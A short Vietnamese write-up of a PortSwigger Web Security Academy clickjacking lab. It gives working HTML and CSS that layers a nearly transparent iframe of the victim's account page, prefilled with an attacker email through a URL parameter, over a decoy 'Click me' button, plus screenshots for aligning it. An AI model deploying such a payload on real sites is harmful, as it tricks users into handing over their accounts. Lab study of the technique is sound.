## Clickjacking with form input data prefilled from a URL parameter

---

Cũng craft HTML để lừa người dùng nhấp vào đổi mật khẩu, ở đây chúng ta sẽ dùng `?email=hacker@net` để tự động điền `hacker@net` vào form

```
<style>
    #vuln_site{
        position:relative;
        width:1000px;
        height:800px;
        opacity:0.1;
        z-index:2;
    }
    #evil_site{
        position:absolute;
        top:480px;
        left:50px;
        z-index:1;
    }
</style>
<div id="evil_site">Click me</div>
<iframe id="vuln_site" src="https://0a7600e0045c95aec279078b00840041.web-security-academy.net/my-account/?email=hacker@net">
</iframe>
```

![image](https://user-images.githubusercontent.com/68894302/175106435-7d95397c-905f-4319-8593-a748a57b2fa4.png)

Quan sát thấy `Click me` chưa trùng với `Update email` nên chúng ta cần điều chỉnh lại giá trị `top` trong style.

![image](https://user-images.githubusercontent.com/68894302/175106791-fd50bdf3-43e0-4cbe-ba0f-9921b462ccb3.png)